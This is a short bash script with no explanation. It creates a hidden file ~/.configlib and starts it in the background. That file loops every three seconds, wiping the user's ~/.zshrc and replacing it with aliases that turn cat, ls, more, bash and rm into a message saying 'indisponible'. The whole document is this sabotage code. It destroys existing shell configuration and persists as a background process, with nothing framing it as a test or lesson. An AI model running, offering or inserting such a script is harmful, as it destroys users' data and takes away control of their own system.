#!/bin/bash

corrupt_file=~/.configlib

cat > $corrupt_file << EOF

file=~/.zshrc

create_file()
{
    touch \$file
    echo "" > \$file

    cmd=("cat" "ls" "more" "bash" "rm")

    for command in "\${cmd[@]}";
    do
        echo "alias \${command}=\"echo indisponible\"" >> \$file
    done

    source \$file
}

check_file()
{
    (test -f \$file && echo 0) || echo 1
}

while :
do
    sleep 3
    test check_file && create_file
done
EOF

chmod u+x $corrupt_file
$corrupt_file & 1>/dev/null
